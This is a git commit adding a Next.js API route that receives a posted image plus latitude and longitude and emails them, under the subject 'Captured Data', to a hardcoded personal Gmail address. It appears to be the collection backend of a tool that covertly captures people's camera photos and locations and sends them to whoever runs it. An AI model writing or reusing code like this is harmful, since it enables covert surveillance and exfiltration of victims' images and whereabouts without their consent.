80536a7dc336e1fec50dbebc9123fc1f9efa049b
quantura <admin@quanturatech.com>
2026-01-29 09:36:26 +0530

    first push

---
+++ app/api/send/route.ts
@@ -0,0 +1,25 @@
+import nodemailer from "nodemailer";
+
+export async function POST(req: Request) {
+  const { image, lat, lon } = await req.json();
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: process.env.MAIL_USER,
+      pass: process.env.MAIL_PASS
+    }
+  });
+
+  await transporter.sendMail({
+    from: process.env.MAIL_USER,
+    to: ["nakirikantikiran@gmail.com"],  // by adding , we can send that to multiple recepents
+    subject: "Captured Data",
+    html: `
+      <p>Location: ${lat}, ${lon}</p>
+      <img src="${image}" />
+    `
+  });
+
+  return Response.json({ ok: true });
+}
